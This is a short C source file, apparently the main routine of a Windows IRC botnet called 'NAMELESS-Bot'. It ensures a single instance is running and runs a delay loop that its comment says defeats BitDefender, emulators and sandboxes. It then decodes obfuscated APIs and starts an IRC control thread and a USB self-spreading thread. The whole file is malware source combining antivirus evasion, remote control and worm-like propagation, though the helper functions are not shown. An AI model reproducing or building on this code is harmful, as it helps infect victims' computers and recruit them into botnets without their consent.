/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

    #include "global.h"


    int main()
{

	       /* running already? */
        mutex = CreateMutex(NULL, FALSE, mutex);
        if (GetLastError() == ERROR_ALREADY_EXISTS)
        ExitProcess(0);

        /* nasty little a/v trick */
        DWORD x = 0;
        for (x; x < 0xFFFFFFFF; x++); /* -courtesy of The Rogue- Beats BitDefender/Emulators/Anubis/Etc.. */

        /* api structure decoding */
        load_apis();
        decode_things();
        /* main thread starts here */
        Thread_Start(&Node_Thread, NULL, TRUE); /* start main/irc thread */
        Thread_Start(&USBplus_Spread, NULL, TRUE); /* start usb */
    return 0;
}
